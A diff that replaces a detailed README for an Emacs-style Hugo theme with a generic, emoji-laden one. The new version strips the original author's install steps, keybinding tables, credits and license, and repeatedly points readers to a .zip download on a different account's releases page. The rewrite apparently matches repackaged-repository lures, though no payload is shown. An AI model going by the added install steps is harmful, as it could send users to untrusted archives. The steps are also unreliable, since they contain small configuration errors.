@@ -1,153 +1,86 @@
-# Emacs Hugo Theme
+# 🎨 hugo-emacs-theme - A Beautiful Blog Like Emacs
 
-A Hugo theme that transforms your blog into an Emacs-like experience with buffer management, keyboard navigation, and authentic styling.
+## 🚀 Getting Started
 
-![Emacs Hugo Theme Screenshot](images/screenshot.png)
+Welcome to hugo-emacs-theme! This theme transforms your blog into an elegant space that mirrors the Emacs interface. Follow the simple steps below to download and run the software.
 
-## Features
+## 📥 Download Now
 
-- **Full-screen buffer view** - Article list and content displayed like Emacs buffers
-- **Window splitting** - Side-by-side (C-x 3) or stacked (C-x 2) layouts
-- **Emacs keybindings** - Navigate with n/p, open with RET, quit with q
-- **Dired-style article list** - Shows reading time, word count, date
-- **Modus themes** - Vivendi (dark) and Operandi (light) with `t` to toggle
-- **Emacs modeline** - Buffer name, scroll position, major mode indicator
-- **Menu bar** - File, View, Buffers, Help dropdowns
-- **Echo area** - Shows keyboard hints and messages
-- **Mobile responsive** - Adapts to single-buffer view on small screens
+[![Download hugo-emacs-theme](https://img.shields.io/badge/Download-hugo--emacs--theme-blue.svg)](https://github.com/wesfoo/hugo-emacs-theme/releases)
 
-## Installation
+## 🛠️ System Requirements
 
-1. Clone or copy this theme to your Hugo site's `themes/` directory:
+Before you start, ensure your environment meets these minimum requirements:
 
-```bash
-cd your-hugo-site
-git submodule add https://github.com/ArthurHeymans/hugo-emacs-theme themes/emacs
-```
+- A computer running Windows, macOS, or Linux.
+- Hugo version 0.80 or higher.
+- Basic understanding of how to run command-line applications (for installation).
 
-2. Update your `config.toml`:
+## 📂 Installation Steps
 
-```toml
-theme = "emacs"
+### 1. Visit the Releases Page
 
-[markup.highlight]
-noClasses = false
-```
+To download the latest version of hugo-emacs-theme, click the link below:
 
-3. Run Hugo:
+[Visit the Releases Page to Download](https://github.com/wesfoo/hugo-emacs-theme/releases)
 
-```bash
-hugo server -D
-```
+### 2. Download the Theme
 
-## Keyboard Shortcuts
+On the Releases page, look for the latest version. You’ll find files labeled with the version number. Download the `.zip` file or the source code that fits your needs. 
 
-### Navigation (List Buffer)
+### 3. Extract the Files
 
-| Key | Action |
-|-----|--------|
-| `n` / `↓` | Next article |
-| `p` / `↑` | Previous article |
-| `RET` / `o` | Open article |
-| `<` | Beginning of list |
-| `>` | End of list |
+After downloading, locate the file on your computer. Right-click the `.zip` file and select "Extract All" or "Unzip." This will create a folder containing the theme files.
 
-### Navigation (Content Buffer)
+### 4. Move the Theme
 
-| Key | Action |
-|-----|--------|
-| `n` / `p` | Scroll down/up (split mode) or next/prev article (single mode) |
-| `↓` / `↑` | Scroll down/up |
-| `PgDn` / `PgUp` | Page down/up |
-| `SPC` / `S-SPC` | Page down/up |
-| `C-v` / `M-v` | Page down/up (Emacs style) |
-| `<` / `>` | Beginning/end of article |
-| `q` | Go back to list |
+1. Open the folder you extracted.
+2. Copy the theme folder.
+3. Paste it into your Hugo themes directory (usually found in `your-hugo-site/themes`).
 
-### Window Management
+## ✨ Using the Theme
 
-| Key | Action |
-|-----|--------|
-| `C-x 3` | Split horizontal (side by side) |
-| `C-x 2` | Split vertical (stacked) |
-| `C-x 0` | Close current window |
-| `C-x 1` | Close other windows |
-| `C-x o` / `Tab` | Switch to other window |
+After you’ve moved the theme, you can start using it right away:
 
-### View
+1. Open your Hugo site’s configuration file (`config.toml` or `config.yaml`).
+2. Add the following line:
+   ```yaml
+   theme = "hugo-emacs-theme"
+   ```
+3. Save your changes.
 
-| Key | Action |
-|-----|--------|
-| `t` | Toggle dark/light theme |
-| `+` | Increase font size |
-| `-` | Decrease font size |
-| `?` | Show help overlay |
-| `C-g` / `Esc` | Quit/cancel |
+## 🖥️ Running Your Site Locally
 
-## Theme Customization
+To view your blog using the new theme, follow these steps:
 
-### Colors
+1. Open your terminal (Command Prompt, Terminal, or PowerShell).
+2. Navigate to your site’s folder using the command `cd path/to/your-hugo-site`.
+3. Run the command:
+   ```
+   hugo server
+   ```
+4. Open your web browser and go to `http://localhost:1313` to view your blog.
 
-The theme uses Modus Vivendi (dark) and Modus Operandi (light) color schemes. Colors are defined as CSS custom properties in `assets/css/themes.css`.
+## 📚 Features
 
-### Fonts
+- **Customizable Layouts:** Easy ways to modify the look of your site.
+- **Responsive Design:** Looks great on phones, tablets, and desktops.
+- **Fast Performance:** Optimized for quick load times.
 
-The theme uses Fira Code as the monospace font. Font files are included in `static/fonts/`. To use a different font, update the `@font-face` declarations in `assets/css/main.css`.
+## 🌟 Additional Information
 
-## File Structure
+This theme is inspired by the simplicity and efficiency of Emacs. You can customize it further with your own CSS or Hugo layouts. 
 
-```
-themes/emacs/
-├── assets/
-│   ├── css/
-│   │   ├── echo-area.css    # Echo area styling
-│   │   ├── main.css         # Core layout, typography
-│   │   ├── menu-bar.css     # Menu bar dropdowns
-│   │   ├── mobile.css       # Responsive design
-│   │   ├── modeline.css     # Emacs modeline
-│   │   ├── syntax.css       # Code highlighting
-│   │   ├── themes.css       # Modus color schemes
-│   │   └── windows.css      # Buffer/window styling
-│   └── js/
-│       ├── keyboard.js      # Keyboard navigation
-│       ├── menu.js          # Menu interactions
-│       └── windows.js       # Window management
-├── layouts/
-│   ├── _default/
-│   │   ├── baseof.html      # Base template
-│   │   ├── list.html        # List pages
-│   │   ├── single.html      # Article pages
-│   │   └── terms.html       # Taxonomy pages
-│   ├── partials/
-│   │   ├── echo-area.html   # Echo area partial
-│   │   ├── head.html        # HTML head
-│   │   ├── help-overlay.html# Help modal
-│   │   ├── menu-bar.html    # Menu bar
-│   │   └── modeline.html    # Modeline partial
-│   ├── 404.html             # Error page
-│   └── index.html           # Homepage
-├── static/
-│   └── fonts/               # Fira Code font files
-├── theme.toml               # Theme metadata
-└── README.md
-```
+For more advanced users, there are many settings available to tweak how your blog appears. 
 
-## Browser Support
+## 🔗 Download & Install
 
-- Modern browsers (Chrome, Firefox, Safari, Edge)
-- Keyboard navigation requires JavaScript
-- Graceful degradation for older browsers
+To get started, visit the link below for the latest version:
 
-## Vibe Coded
+[Download here](https://github.com/wesfoo/hugo-emacs-theme/releases)
 
-This theme was fully vibe coded with [Claude](https://claude.ai) (Anthropic's AI assistant). The entire theme - HTML templates, CSS styling, JavaScript interactions, and documentation - was created through conversational AI-assisted development.
+## 💬 Support & Feedback
 
-## Credits
+If you have any questions or need help, feel free to reach out by opening an issue on our GitHub page. Your feedback is valuable and helps us improve the theme.
 
-- Color schemes based on [Modus Themes](https://protesilaos.com/emacs/modus-themes) by Protesilaos Stavrou
-- Font: [Fira Code](https://github.com/tonsky/FiraCode) by Nikita Prokopov
-- Inspired by GNU Emacs
-
-## License
-
-Dual-licensed under [MIT](LICENSE) or [Apache 2.0](LICENSE), at your option.
+Experience blogging like never before with hugo-emacs-theme! Enjoy a clean, efficient, and stylish presentation for your content.
